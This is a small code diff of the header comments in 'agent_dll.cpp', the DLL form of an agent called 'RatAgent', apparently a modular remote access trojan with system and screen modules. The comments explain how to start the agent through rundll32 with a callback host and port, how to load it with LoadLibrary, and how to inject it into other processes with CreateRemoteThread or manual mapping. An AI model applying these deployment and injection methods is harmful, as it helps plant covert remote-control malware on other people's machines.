@@ -1,11 +1,11 @@
-// agent_dll.cpp — RatAgent 的 DLL 形态
+// agent_dll.cpp — Agent 的 DLL 形态（所有模块共用；具体能力由各模块工程的 caps.cpp 登记）
 //
-// 三种宿主都能用：
+// 三种宿主都能用（文件名里的 `<module>` 见 core/module_id.h，如 sys / screen）：
 //   1) rundll32（导出 Start 阻塞运行，保证进程存活）：
-//        rundll32 RatAgent.dll,Start 127.0.0.1,8080,-s,5
-//        rundll32 RatAgent.dll,Stop                ← 另一进程触发跨进程停止事件
+//        rundll32 RatAgent.<module>.dll,Start 127.0.0.1,8080,-s,5
+//        rundll32 RatAgent.<module>.dll,Stop        ← 另一进程触发跨进程停止事件
 //   2) 自己的加载器 / LoadLibrary 宿主（同一进程内启停，可 FreeLibrary 卸载）：
-//        LoadLibraryW(L"RatAgent.dll") → GetProcAddress("StartAgent")(args) → ... → StopAgent()
+//        LoadLibraryW(L"RatAgent.<module>.dll") → GetProcAddress("StartAgent")(args) → ... → StopAgent()
 //   3) 注入（CreateRemoteThread + LoadLibrary，或手动映射）：
 //        远端线程入口用 StartAgent(const char*)：单指针参数，便于 lpParameter 直接传配置串
 //
